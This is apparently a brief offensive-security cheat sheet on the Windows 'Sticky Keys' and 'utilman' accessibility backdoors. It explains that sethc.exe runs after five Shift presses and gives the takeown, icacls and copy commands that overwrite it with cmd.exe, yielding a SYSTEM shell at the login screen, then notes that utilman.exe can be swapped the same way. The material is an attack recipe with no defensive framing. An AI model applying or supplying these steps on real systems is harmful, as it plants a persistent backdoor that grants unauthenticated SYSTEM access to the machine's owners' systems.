### Sticky Keys
- When we press shift 5 times, the program located at `C:\Windows\System32\sethc.exe` is executed.
- We can chage this binary to `cmd.exe`, we can get a SYSTEM level shell even from the login screen.
- We need to have proper permission to change this binary
```powershell
# Take ownership of the binary
takeown /f C:\Windows\System32\sethc.exe
# Give Administrator full permission to the binary
icacls C:\Windows\System32\sethc.exe /grant Administrator:F
# copy the binary
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```
- Now we can get SYSTEM shell if we press shift 5 times anywhere.

### utilman
- Simiar to `C:\Windows\System32\sethc.exe` , when we click on `easeofaccess` button on login screen, `C:\Windows\System32\utilman.exe` is executed.
- We can change this binary after taking ownership of this binary.